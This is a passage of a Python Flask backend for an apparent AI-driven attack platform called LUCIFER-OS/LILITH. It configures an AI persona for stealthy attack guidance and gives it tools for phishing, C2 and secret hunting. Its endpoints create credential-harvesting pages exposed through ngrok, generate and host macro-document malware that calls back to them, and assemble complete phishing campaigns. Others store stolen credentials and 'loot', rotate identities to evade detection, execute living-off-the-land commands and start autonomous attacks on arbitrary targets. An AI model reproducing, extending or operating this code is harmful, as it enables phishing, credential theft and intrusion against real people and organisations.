            return jsonify({'success': False, 'error': str(e)})
    
    # Check if skill exists
    skill_dir = OPENCLAW_DIR / 'skills' / skill_name
    if not skill_dir.exists():
        return jsonify({'success': False, 'error': f'Skill "{skill_name}" not found'})
    
    # Run the skill
    cmd = f'skills run {skill_name}'
    if args:
        cmd += f' {args}'
    
    result = run_openclaw_command(cmd, timeout=timeout)
    return jsonify(result)

def handle_lilith_skill(args, timeout):
    """Handle LILITH skill - advanced offensive security AI"""
    try:
        manager = get_ai_manager()
        message = args.get('message', '') if isinstance(args, dict) else str(args)
        
        if not message:
            return {'success': False, 'error': 'No message provided for LILITH'}
        
        response = manager.chat(message, system_prompt="""You are LILITH, an advanced offensive security AI specifically designed for LUCIFER-OS.
        Provide strategic attack guidance, reconnaissance analysis, vulnerability assessment, and exploitation recommendations.
        Focus on red team operations, network scanning, web analysis, DNS enumeration, RCE, web attacks, and post-exploitation.
        Always prioritize stealth and effectiveness in your recommendations.""")
        
        return {
            'success': True,
            'output': response,
            'skill': 'lilith',
            'type': 'offensive_ai'
        }
    except Exception as e:
        return {'success': False, 'error': str(e)}

def handle_healthcheck_skill(args, timeout):
    """Handle Healthcheck skill - security auditing and hardening"""
    try:
        import subprocess
        import platform
        
        results = []
        
        # OS Information
        results.append(f"OS: {platform.system()} {platform.release()}")
        
        # Firewall status (Linux)
        if platform.system() == 'Linux':
            try:
                fw_result = subprocess.run(['ufw', 'status'], capture_output=True, text=True, timeout=10)
                results.append(f"Firewall: {fw_result.stdout.strip()}")
            except:
                results.append("Firewall: Unable to check")
        
        # SSH hardening check
        try:
            ssh_result = subprocess.run(['sshd', '-T'], capture_output=True, text=True, timeout=10)
            ssh_config = ssh_result.stdout
            if 'PermitRootLogin no' in ssh_config:
                results.append("SSH: Root login disabled ✓")
            else:
                results.append("SSH: Root login may be enabled ⚠️")
        except:
            results.append("SSH: Unable to check SSH config")
        
        # AI Manager health
        try:
            manager = get_ai_manager()
            ai_health = manager.get_health_status()
            results.append(f"AI Providers: {len(ai_health.get('providers', {}))} active")
        except:
            results.append("AI Providers: Unable to check")
        
        return {
            'success': True,
            'output': '\n'.join(results),
            'skill': 'healthcheck',
            'recommendations': [
                "Ensure firewall is active",
                "Disable root SSH login",
                "Keep system updated",
                "Monitor AI provider usage"
            ]
        }
    except Exception as e:
        return {'success': False, 'error': str(e)}

def handle_model_usage_skill(args, timeout):
    """Handle Model-Usage skill - AI provider cost tracking"""
    try:
        manager = get_ai_manager()
        stats = manager.get_provider_stats()
        
        usage_report = []
        total_cost = 0
        
        for provider_name, provider_stats in stats.items():
            tokens_gen = provider_stats.get('tokens_generated', 0)
            tokens_refused = provider_stats.get('tokens_refused', 0)
            cost = provider_stats.get('estimated_cost', 0)
            total_cost += cost
            
            usage_report.append(f"{provider_name}:")
            usage_report.append(f"  Tokens Generated: {tokens_gen:,}")
            usage_report.append(f"  Tokens Refused: {tokens_refused:,}")
            usage_report.append(f"  Estimated Cost: ${cost:.4f}")
            usage_report.append("")
        
        usage_report.append(f"Total Estimated Cost: ${total_cost:.4f}")
        
        return {
            'success': True,
            'output': '\n'.join(usage_report),
            'skill': 'model-usage',
            'total_cost': total_cost,
            'providers': list(stats.keys())
        }
    except Exception as e:
        return {'success': False, 'error': str(e)}

def handle_session_logs_skill(args, timeout):
    """Handle Session-Logs skill - conversation history analysis"""
    try:
        # This would integrate with actual session storage
        # For now, return a mock response
        logs_summary = {
            'total_sessions': 0,
            'total_messages': 0,
            'cost_tracking': {'total_cost': 0, 'by_provider': {}}
        }
        
        return {
            'success': True,
            'output': f"Session Logs Analysis:\nTotal Sessions: {logs_summary['total_sessions']}\nTotal Messages: {logs_summary['total_messages']}\nTotal Cost: ${logs_summary['cost_tracking']['total_cost']:.4f}",
            'skill': 'session-logs',
            'data': logs_summary
        }
    except Exception as e:
        return {'success': False, 'error': str(e)}

def handle_voice_call_skill(args, timeout):
    """Handle Voice-Call skill - voice communication integration"""
    try:
        # Mock voice call functionality
        call_config = {
            'providers': ['twilio', 'telnyx', 'plivo'],
            'mock_mode': True,
            'status': 'ready'
        }
        
        return {
            'success': True,
            'output': f"Voice Call System Ready\nProviders: {', '.join(call_config['providers'])}\nMock Mode: {call_config['mock_mode']}\nStatus: {call_config['status']}",
            'skill': 'voice-call',
            'config': call_config
        }
    except Exception as e:
        return {'success': False, 'error': str(e)}

def handle_coding_agent_skill(args, timeout):
    """Handle Coding-Agent skill - programmatic AI coding control"""
    try:
        # Mock coding agent functionality
        agents = ['codex', 'claude-code', 'pi']
        status = {'active_sessions': 0, 'background_processes': 0}
        
        return {
            'success': True,
            'output': f"Coding Agents Available: {', '.join(agents)}\nActive Sessions: {status['active_sessions']}\nBackground Processes: {status['background_processes']}",
            'skill': 'coding-agent',
            'agents': agents,
            'status': status
        }
    except Exception as e:
        return {'success': False, 'error': str(e)}

# Curated red team skills for prioritization
REDTEAM_SKILLS = {
    'critical': ['lilith', 'healthcheck', 'coding-agent', 'github', 'discord', 'slack', 'himalaya'],
    'high': ['model-usage', 'session-logs', 'voice-call', 'summarize', 'oracle', 'nano-pdf', 'openai-whisper', 'openai-whisper-api', 
             'openai-image-gen', 'sherpa-onnx-tts', 'camsnap', 'peekaboo'],
    'useful': ['tmux', 'trello', 'notion', 'obsidian', 'blogwatcher', 'video-frames', 
               'weather', 'imsg', 'wacli', 'bird', 'gemini', 'skill-creator']
}

@app.route('/openclaw/redteam-skills', methods=['GET'])
def openclaw_redteam_skills():
    """Get curated red team skills organized by priority"""
    return jsonify({
        'success': True,
        'skills': REDTEAM_SKILLS,
        'total': sum(len(v) for v in REDTEAM_SKILLS.values())
    })

@app.route('/openclaw/chat', methods=['POST'])
def openclaw_chat():
    """
    Enhanced chat that can use OpenClaw skills when appropriate.
    LILITH analyzes the request and decides whether to use OpenClaw tools.
    Prioritizes red team relevant skills.
    """
    data = request.json or {}
    message = data.get('message', '')
    use_tools = data.get('use_tools', True)
    
    if not message:
        return jsonify({'success': False, 'error': 'No message provided'})
    
    # Get curated red team skills (not all 52)
    available_skills = []
    if OPENCLAW_AVAILABLE and use_tools:
        # Use curated red team skills instead of all skills
        for tier in ['critical', 'high', 'useful']:
            available_skills.extend(REDTEAM_SKILLS.get(tier, []))
    
    # Build enhanced prompt with tool awareness
    enhanced_prompt = message
    if available_skills and use_tools:
        # Organized skill list for better AI understanding
        skill_context = """You have access to OpenClaw tools for red team operations:

🔴 CRITICAL (use frequently):
- coding-agent: Generate exploit code, scripts, payloads
- github: Search repos for secrets, API keys, credentials
- discord: C2 communication, attack notifications
- slack: Enterprise reconnaissance, internal comms
- himalaya: Email operations, phishing campaigns

🟠 HIGH VALUE:
- summarize: Analyze large documents or data dumps
- oracle: AI reasoning for attack planning
- nano-pdf: PDF analysis and metadata extraction
- openai-whisper: Transcribe audio recordings
- openai-image-gen: Generate fake profiles, phishing images
- camsnap/peekaboo: Evidence capture and surveillance

🟡 USEFUL:
- trello/notion/obsidian: Document findings
- blogwatcher: Monitor vulnerability disclosures
- bird: Twitter/X OSINT reconnaissance

To use a tool, respond with: [TOOL: skill_name] <task description>
Example: [TOOL: github] search for AWS keys in org:targetcorp
Example: [TOOL: coding-agent] write a python port scanner

"""
        enhanced_prompt = f"{skill_context}\nUser request: {message}"
    
    # Get AI response
    if AI_PROVIDER_AVAILABLE:
        manager = get_ai_manager()
        result = manager.chat(enhanced_prompt)
        ai_response = result.get('response', '')
        provider = result.get('provider', 'Unknown')
    else:
        ai_response = lilith.reason(enhanced_prompt)
        provider = 'Legacy'
    
    # Check if AI wants to use a tool - support multiple tools
    import re
    tool_matches = re.findall(r'\[TOOL:\s*([\w-]+)\]\s*([^\[]*?)(?=\[TOOL:|$)', ai_response, re.IGNORECASE | re.DOTALL)
    
    response_data = {
        'success': True,
        'response': ai_response,
        'provider': provider,
        'tool_used': [],
        'tool_outputs': {}
    }
    
    if tool_matches and OPENCLAW_AVAILABLE:
        for skill_name, skill_args in tool_matches:
            skill_name = skill_name.lower().strip()
            skill_args = skill_args.strip()
            
            if not skill_args:
                continue
            
            # Verify skill exists
            skill_dir = OPENCLAW_DIR / 'skills' / skill_name
            
            # Also check for built-in skills
            builtin_skills = ['oracle', 'discord', 'slack', 'github', 'coding-agent']
            
            if skill_dir.exists() or skill_name in builtin_skills:
                # Use the proper skill execution method
                try:
                    tool_result = run_openclaw_skill(skill_name, skill_args, timeout=120)
                    response_data['tool_used'].append(skill_name)
                    
                    if tool_result['success']:
                        response_data['tool_outputs'][skill_name] = {
                            'success': True,
                            'output': tool_result.get('output', 'Skill executed')[:2000]  # Limit output size
                        }
                    else:
                        response_data['tool_outputs'][skill_name] = {
                            'success': False,
                            'error': tool_result.get('error', 'Tool execution failed')
                        }
                except Exception as e:
                    response_data['tool_outputs'][skill_name] = {
                        'success': False,
                        'error': str(e)
                    }
            else:
                response_data['tool_outputs'][skill_name] = {
                    'success': False,
                    'error': f"Skill '{skill_name}' not found"
                }
        
        # Add summary to response
        successful = [k for k, v in response_data['tool_outputs'].items() if v.get('success')]
        failed = [k for k, v in response_data['tool_outputs'].items() if not v.get('success')]
        
        summary = ""
        if successful:
            summary += f"\n\n📋 Tools executed: {', '.join(successful)}"
        if failed:
            summary += f"\n\n⚠️ Tools failed: {', '.join(failed)}"
        
        response_data['response'] += summary
    
    return jsonify(response_data)

# ==================== ATTACK SERVER ENDPOINTS ====================

@app.route('/attack/start', methods=['POST'])
def attack_server_start():
    """Start the attack infrastructure server"""
    try:
        from attack_server import get_attack_server
        server = get_attack_server()
        
        data = request.json or {}
        port = data.get('port', 8888)
        
        result = server.start_server(port)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/attack/ngrok', methods=['POST'])
def attack_start_ngrok():
    """Start ngrok tunnel for public access"""
    try:
        from attack_server import get_attack_server
        server = get_attack_server()
        result = server.start_ngrok()
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/attack/harvester', methods=['POST'])
def attack_create_harvester():
    """Create a credential harvester page"""
    try:
        from attack_server import get_attack_server
        server = get_attack_server()
        
        # Auto-start server if not running
        if not server.running:
            server.start_server()
        
        data = request.json or {}
        template = data.get('template', 'microsoft')
        redirect_url = data.get('redirect_url')
        custom_title = data.get('title')
        custom_logo = data.get('logo_url')
        
        result = server.create_harvester(template, redirect_url, custom_title, custom_logo)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/attack/payload', methods=['POST'])
def attack_create_payload():
    """Create a hosted payload download link"""
    try:
        from attack_server import get_attack_server
        from malware_factory import get_malware_factory
        import base64
        
        server = get_attack_server()
        factory = get_malware_factory()
        
        # Auto-start server if not running
        if not server.running:
            server.start_server()
        
        data = request.json or {}
        malware_type = data.get('malware_type', 'macro_doc')
        callback_url = data.get('callback_url')
        
        # Generate malware
        malware = factory.create_email_attachment(malware_type, callback_url)
        if not malware.get('success'):
            return jsonify(malware)
        
        # Host it
        content = base64.b64decode(malware['content_b64'])
        result = server.create_payload_link(content, malware['filename'])
        result['malware_type'] = malware_type
        result['instructions'] = malware.get('instructions', '')
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/attack/captures', methods=['GET'])
def attack_get_captures():
    """Get all captured credentials"""
    try:
        from attack_server import get_attack_server
        server = get_attack_server()
        
        campaign_id = request.args.get('campaign_id')
        captures = server.get_captures(campaign_id)
        
        return jsonify({'success': True, 'captures': captures, 'count': len(captures)})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/attack/status', methods=['GET'])
def attack_server_status():
    """Get attack server status"""
    try:
        from attack_server import get_attack_server
        server = get_attack_server()
        status = server.get_status()
        return jsonify({'success': True, **status})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/attack/templates', methods=['GET'])
def attack_get_templates():
    """Get available harvester templates"""
    try:
        from attack_server import get_attack_server
        server = get_attack_server()
        templates = list(server.HARVESTER_TEMPLATES.keys())
        return jsonify({'success': True, 'templates': templates})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/attack/full_campaign', methods=['POST'])
def attack_full_campaign():
    """
    Create a complete attack campaign:
    1. Start attack server
    2. Create credential harvester
    3. Generate malware payload with harvester callback
    4. Return all URLs ready for phishing
    """
    try:
        from attack_server import get_attack_server
        from malware_factory import get_malware_factory
        import base64
        
        server = get_attack_server()
        factory = get_malware_factory()
        
        # Start server
        if not server.running:
            server.start_server()
        
        data = request.json or {}
        harvester_template = data.get('harvester_template', 'microsoft')
        malware_type = data.get('malware_type', 'macro_doc')
        redirect_url = data.get('redirect_url', 'https://www.google.com')
        
        # Create harvester
        harvester = server.create_harvester(
            template=harvester_template,
            redirect_url=redirect_url
        )
        
        # Create payload that calls back to harvester
        malware = factory.create_email_attachment(
            attack_type=malware_type,
            payload_url=harvester['public_url']
        )
        
        # Host payload
        payload_result = None
        if malware.get('success'):
            content = base64.b64decode(malware['content_b64'])
            payload_result = server.create_payload_link(content, malware['filename'])
        
        return jsonify({
            'success': True,
            'campaign': {
                'harvester': harvester,
                'payload': payload_result,
                'malware': {
                    'type': malware_type,
                    'filename': malware.get('filename'),
                    'instructions': malware.get('instructions')
                }
            },
            'attack_url': harvester['public_url'],
            'payload_url': payload_result['public_url'] if payload_result else None,
            'note': 'Use attack_url in phishing emails, payload_url for direct downloads'
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ==================== STERILIZE ENDPOINTS ====================

@app.route('/sterilize/scan', methods=['GET'])
def sterilize_scan():
    """Return scan results (processes & files) - read-only, safe"""
    if not STERILIZER_AVAILABLE:
        return jsonify({'success': False, 'error': 'Sterilizer not available on this system'}), 500
    try:
        s = Sterilizer()
        return jsonify({'success': True, 'report': {'processes': s.scan_processes(), 'files': s.scan_files()}})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


def is_admin():
    """Return True if running with elevated privileges"""
    try:
        if os.name == 'nt':
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.geteuid() == 0
    except Exception:
        return False


@app.route('/sterilize/run', methods=['POST'])
def sterilize_run():
    """Run sterilize actions. Must include confirm=True to perform destructive actions"""
    if not STERILIZER_AVAILABLE:
        return jsonify({'success': False, 'error': 'Sterilizer not available on this system'}), 500
    data = request.json or {}
    dry_run = bool(data.get('dry_run', True))
    confirm = bool(data.get('confirm', False))
    kill = bool(data.get('kill', False))
    quarantine = bool(data.get('quarantine', False))
    compress = bool(data.get('compress', False))
    force = bool(data.get('force', False))

    # Safety: destructive actions require explicit confirm
    if not confirm and (kill or quarantine):
        return jsonify({'success': False, 'error': 'Destructive operations require confirm=True'}), 400

    # If kill requested ensure admin privileges
    if kill and not is_admin():
        return jsonify({'success': False, 'error': 'Killing processes requires administrative privileges. Run as admin.'}), 403

    try:
        s = Sterilizer()
        report = s.run(dry_run=dry_run, confirm=confirm, kill=kill, quarantine=quarantine, compress=compress, force=force)
        # If run indicated that force is required to proceed (safety threshold), return informative error
        if report.get('need_force'):
            return jsonify({'success': False, 'error': report.get('note', 'High-risk kill requires force=True'), 'report': report}), 400
        return jsonify({'success': True, 'report': report})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/reset-api-keys', methods=['POST'])
def reset_api_keys():
    """Reset all API keys and regenerate them"""
    try:
        # Import the API key generation function
        from guaranteed_endpoint import generate_api_keys
        
        # Generate new keys
        new_keys = generate_api_keys()
        
        # Update the config file
        config_path = Path(__file__).parent.parent / 'config' / 'lucifera.conf'
        if config_path.exists():
            import configparser
            config = configparser.ConfigParser()
            config.read(config_path)
            
            if 'lilith' not in config:
                config.add_section('lilith')
            
            # Update keys in config
            for provider, key in new_keys.items():
                if provider == 'groq':
                    config.set('lilith', 'groq_api_key', key)
                elif provider == 'hf':
                    config.set('lilith', 'hf_token', key)
            
            with open(config_path, 'w') as f:
                config.write(f)
        
        # Reset AI provider manager to pick up new keys
        if AI_PROVIDER_AVAILABLE:
            global _ai_manager
            _ai_manager = None  # Force recreation
        
        return jsonify({
            'success': True, 
            'message': f'Generated {len(new_keys)} new API keys',
            'providers': list(new_keys.keys())
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ==================== ATTACK MEMORY ENDPOINTS ====================

@app.route('/agent/memory/stats', methods=['GET'])
def agent_memory_stats():
    """Get attack memory statistics"""
    try:
        from attack_memory import get_memory
        memory = get_memory()
        
        # Get database stats
        conn = sqlite3.connect(memory.db_path)
        c = conn.cursor()
        
        # Overall stats
        c.execute('''SELECT 
            COUNT(*) as total_codes,
            AVG(success_rate) as avg_success,
            SUM(times_used) as total_usage,
            COUNT(DISTINCT code_type) as unique_types,
            COUNT(DISTINCT target_type) as unique_targets
            FROM generated_code''')
        code_stats = c.fetchone()
        
        # Attack stats
        c.execute('''SELECT 
            COUNT(*) as total_attacks,
            AVG(success) as attack_success_rate,
            COUNT(DISTINCT target_fingerprint) as unique_targets_attacked
            FROM attacks''')
        attack_stats = c.fetchone()
        
        # Loot stats
        c.execute('''SELECT 
            COUNT(*) as total_loot,
            COUNT(DISTINCT loot_type) as loot_types
            FROM loot''')
        loot_stats = c.fetchone()
        
        # Credential stats
        c.execute('''SELECT 
            COUNT(*) as total_creds,
            SUM(valid) as valid_creds,
            COUNT(DISTINCT cred_type) as cred_types
            FROM credentials''')
        cred_stats = c.fetchone()
        
        conn.close()
        
        return jsonify({
            'success': True,
            'stats': {
                'generated_code': {
                    'total': code_stats[0] or 0,
                    'avg_success_rate': round(code_stats[1] or 0, 2),
                    'total_usage': code_stats[2] or 0,
                    'unique_types': code_stats[3] or 0,
                    'unique_targets': code_stats[4] or 0
                },
                'attacks': {
                    'total': attack_stats[0] or 0,
                    'success_rate': round(attack_stats[1] or 0, 2),
                    'unique_targets': attack_stats[2] or 0
                },
                'loot': {
                    'total': loot_stats[0] or 0,
                    'types': loot_stats[1] or 0
                },
                'credentials': {
                    'total': cred_stats[0] or 0,
                    'valid': cred_stats[1] or 0,
                    'types': cred_stats[2] or 0
                }
            }
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/agent/memory/suggest', methods=['POST'])
def agent_memory_suggest():
    """Get AI attack suggestions based on memory"""
    try:
        from attack_memory import get_memory
        memory = get_memory()
        
        data = request.json or {}
        target_domain = data.get('target', '')
        target_type = data.get('target_type', 'web')
        
        # Get best performing code for this target type
        best_code = memory.get_best_code_for_target('exploit', target_type, 0.5)
        
        # Get recent successful attacks on similar targets
        suggestions = []
        
        if best_code:
            suggestions.append({
                'type': 'proven_code',
                'code_type': best_code['code_type'],
                'success_rate': best_code['success_rate'],
                'code_preview': best_code['code'][:200] + '...' if len(best_code['code']) > 200 else best_code['code']
            })
        
        # Get attack patterns from database
        conn = sqlite3.connect(memory.db_path)
        c = conn.cursor()
        c.execute('''SELECT attack_type, attack_vector, AVG(success) as success_rate, COUNT(*) as times_used
                     FROM attacks 
                     WHERE success = 1 
                     GROUP BY attack_type, attack_vector 
                     ORDER BY success_rate DESC, times_used DESC 
                     LIMIT 5''')
        patterns = c.fetchall()
        conn.close()
        
        for pattern in patterns:
            suggestions.append({
                'type': 'attack_pattern',
                'attack_type': pattern[0],
                'vector': pattern[1],
                'success_rate': round(pattern[2], 2),
                'times_used': pattern[3]
            })
        
        return jsonify({
            'success': True,
            'target': target_domain,
            'suggestions': suggestions,
            'count': len(suggestions)
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/agent/memory/loot', methods=['GET'])
def agent_memory_loot():
    """Get captured loot"""
    try:
        from attack_memory import get_memory
        memory = get_memory()
        
        loot_type = request.args.get('type')
        target_fingerprint = request.args.get('target')
        
        conn = sqlite3.connect(memory.db_path)
        c = conn.cursor()
        
        query = '''SELECT id, target_fingerprint, loot_type, data, source, timestamp, used
                   FROM loot WHERE 1=1'''
        params = []
        
        if loot_type:
            query += ' AND loot_type = ?'
            params.append(loot_type)
        
        if target_fingerprint:
            query += ' AND target_fingerprint = ?'
            params.append(target_fingerprint)
        
        query += ' ORDER BY timestamp DESC LIMIT 50'
        
        c.execute(query, params)
        loot_items = []
        
        for row in c.fetchall():
            try:
                data = json.loads(row[3]) if row[3] else None
            except:
                data = str(row[3])
            
            loot_items.append({
                'id': row[0],
                'target': row[1],
                'type': row[2],
                'data': data,
                'source': row[4],
                'timestamp': row[5],
                'used': bool(row[6])
            })
        
        conn.close()
        
        return jsonify({
            'success': True,
            'loot': loot_items,
            'count': len(loot_items)
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/agent/memory/credentials', methods=['GET'])
def agent_memory_credentials():
    """Get captured credentials"""
    try:
        from attack_memory import get_memory
        memory = get_memory()
        
        cred_type = request.args.get('type')
        valid_only = request.args.get('valid_only', 'false').lower() == 'true'
        
        conn = sqlite3.connect(memory.db_path)
        c = conn.cursor()
        
        query = '''SELECT id, target_fingerprint, username, password, hash, cred_type, 
                          source, tested, valid, timestamp
                   FROM credentials WHERE 1=1'''
        params = []
        
        if cred_type:
            query += ' AND cred_type = ?'
            params.append(cred_type)
        
        if valid_only:
            query += ' AND valid = 1'
        
        query += ' ORDER BY timestamp DESC LIMIT 50'
        
        c.execute(query, params)
        creds = []
        
        for row in c.fetchall():
            creds.append({
                'id': row[0],
                'target': row[1],
                'username': row[2],
                'password': row[3],
                'hash': row[4],
                'type': row[5],
                'source': row[6],
                'tested': bool(row[7]),
                'valid': bool(row[8]),
                'timestamp': row[9]
            })
        
        conn.close()
        
        return jsonify({
            'success': True,
            'credentials': creds,
            'count': len(creds)
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ==================== STEALTH ENDPOINTS ====================

@app.route('/agent/stealth/headers', methods=['GET'])
def agent_stealth_headers():
    """Get stealth request headers for current identity"""
    try:
        from stealth_engine import get_stealth
        stealth = get_stealth()
        
        headers = stealth.get_headers()
        return jsonify({
            'success': True,
            'headers': headers,
            'user_agent': headers.get('User-Agent', 'Unknown'),
            'identity': 'current'
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/agent/stealth/rotate', methods=['POST'])
def agent_stealth_rotate():
    """Rotate to a new stealth identity"""
    try:
        from stealth_engine import get_stealth
        stealth = get_stealth()
        
        old_ua = stealth.current_user_agent
        stealth.rotate_identity()
        new_ua = stealth.current_user_agent
        
        return jsonify({
            'success': True,
            'old_identity': old_ua,
            'new_identity': new_ua,
            'message': 'Identity rotated successfully'
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/agent/stealth/status', methods=['GET'])
def agent_stealth_status():
    """Get current stealth status"""
    try:
        from stealth_engine import get_stealth
        stealth = get_stealth()
        
        return jsonify({
            'success': True,
            'current_user_agent': stealth.current_user_agent,
            'identities_available': len(stealth.USER_AGENTS),
            'timing_jitter': 'enabled',
            'traffic_mimicry': 'ready'
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ==================== LOTL ENDPOINTS ====================

@app.route('/agent/lotl/commands', methods=['GET'])
def agent_lotl_commands():
    """Get Living-Off-The-Land command arsenal"""
    try:
        from stealth_engine import LOTLArsenal
        lotl = LOTLArsenal()
        
        category = request.args.get('category')
        
        if category:
            commands = lotl.get_commands_by_category(category)
        else:
            commands = {}
            for cat in lotl.categories:
                commands[cat] = lotl.get_commands_by_category(cat)
        
        return jsonify({
            'success': True,
            'commands': commands,
            'categories': list(lotl.categories) if not category else [category],
            'total_commands': sum(len(cmds) for cmds in commands.values()) if isinstance(commands, dict) else len(commands)
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/agent/lotl/execute', methods=['POST'])
def agent_lotl_execute():
    """Execute a LOTL command (safe, read-only operations only)"""
    try:
        from stealth_engine import LOTLArsenal
        lotl = LOTLArsenal()
        
        data = request.json or {}
        command_name = data.get('command')
        category = data.get('category')
        
        if not command_name:
            return jsonify({'success': False, 'error': 'Command name required'})
        
        # Only allow safe, read-only commands
        safe_commands = [
            'systeminfo', 'whoami', 'hostname', 'ipconfig', 'netstat', 'tasklist',
            'dir', 'type', 'find', 'findstr', 'wmic', 'reg query', 'sc query'
        ]
        
        command_safe = any(safe in command_name.lower() for safe in safe_commands)
        
        if not command_safe:
            return jsonify({'success': False, 'error': 'Command not in safe LOTL arsenal'})
        
        # Execute command
        result = subprocess.run(
            command_name,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        
        return jsonify({
            'success': result.returncode == 0,
            'command': command_name,
            'stdout': result.stdout[:2000],  # Limit output
            'stderr': result.stderr[:1000],
            'returncode': result.returncode
        })
    except subprocess.TimeoutExpired:
        return jsonify({'success': False, 'error': 'Command timed out'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ==================== AUTONOMOUS AGENT ENDPOINTS ====================

@app.route('/agent/autonomous/start', methods=['POST'])
def agent_autonomous_start():
    """Start autonomous attack mode"""
    try:
        from autonomous_agent import get_autonomous_agent
        agent = get_autonomous_agent()
        
        data = request.json or {}
        target = data.get('target', '')
        attack_type = data.get('attack_type', 'recon')  # recon, exploit, full
        
        if not target:
            return jsonify({'success': False, 'error': 'Target required'})
        
        # Start autonomous attack
        success = agent.start_attack(target, attack_type)
        
        if success:
            return jsonify({
                'success': True,
                'message': f'Autonomous {attack_type} attack started against {target}',
                'attack_id': f"{target}_{int(time.time())}"
            })
        else:
            return jsonify({'success': False, 'error': 'Failed to start autonomous attack'})
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/agent/autonomous/stop', methods=['POST'])
def agent_autonomous_stop():
    """Stop autonomous attack"""
    try:
        from autonomous_agent import get_autonomous_agent
        agent = get_autonomous_agent()
        
        success = agent.stop_attack()
        
        return jsonify({
            'success': success,
            'message': 'Autonomous attack stopped' if success else 'No active attack to stop'
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/agent/autonomous/status', methods=['GET'])
def agent_autonomous_status():
    """Get autonomous attack status"""
    try:
        from autonomous_agent import get_autonomous_agent
        agent = get_autonomous_agent()
        
        status = agent.get_status()
        
        return jsonify({
            'success': True,
            'status': status
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ==================== VICTORY CONDITION ENDPOINTS ====================

@app.route('/agent/victory/check', methods=['POST'])
def agent_victory_check():
    """Check for victory conditions in current context"""
    try:
        from autonomous_agent import VictoryCondition
        
        data = request.json or {}
        context = data.get('context', {})
        response_data = data.get('response', '')
        
        victories = []
        
        # Check various victory conditions
        if 'admin' in response_data.lower() and 'access' in response_data.lower():
            victories.append({
                'condition': 'admin_access',
                'confidence': 0.8,
                'evidence': 'Admin access detected in response'
            })
        
        if 'uid=' in response_data or 'whoami' in response_data:
            victories.append({
                'condition': 'rce',
                'confidence': 0.9,
                'evidence': 'Remote code execution confirmed'
            })
        
        if 'session' in context.get('cookies', {}) or 'auth' in context.get('cookies', {}):
            victories.append({
                'condition': 'credential_capture',
                'confidence': 0.7,
                'evidence': 'Authentication cookies captured'
            })
        
        if 'root:' in response_data or '[boot loader]' in response_data.lower():
            victories.append({
                'condition': 'file_read',
                'confidence': 0.95,
                'evidence': 'System file access confirmed'
            })
        
        return jsonify({
            'success': True,
            'victories': victories,
            'victory_count': len(victories),
            'overall_status': 'victory' if victories else 'ongoing'
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/agent/victory/conditions', methods=['GET'])
def agent_victory_conditions():
    """Get all available victory conditions"""
    try:
        from autonomous_agent import VictoryCondition
        
        conditions = []
        for condition in VictoryCondition:
            conditions.append({
                'name': condition.name,
                'value': condition.value,
                'description': f'Victory condition for {condition.name.replace("_", " ")}'
            })
        
        return jsonify({
            'success': True,
            'conditions': conditions,
            'count': len(conditions)
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


if __name__ == '__main__':
    # Auto-start attack server on backend startup
    try:
        from attack_server import get_attack_server
        attack_srv = get_attack_server()
        attack_srv.start_server()
        print("[LILITH] Attack server started on port 8888")
    except Exception as e:
        print(f"[LILITH] Warning: Could not start attack server: {e}")
    
    print("👹 LILITH Backend (OpenClaw) starting on port 5000...")
    # Get host from environment or use 0.0.0.0 to be accessible externally
    host = os.environ.get('BACKEND_HOST', '0.0.0.0')
    port = int(os.environ.get('BACKEND_PORT', '5000'))
    app.run(host=host, port=port, debug=False)
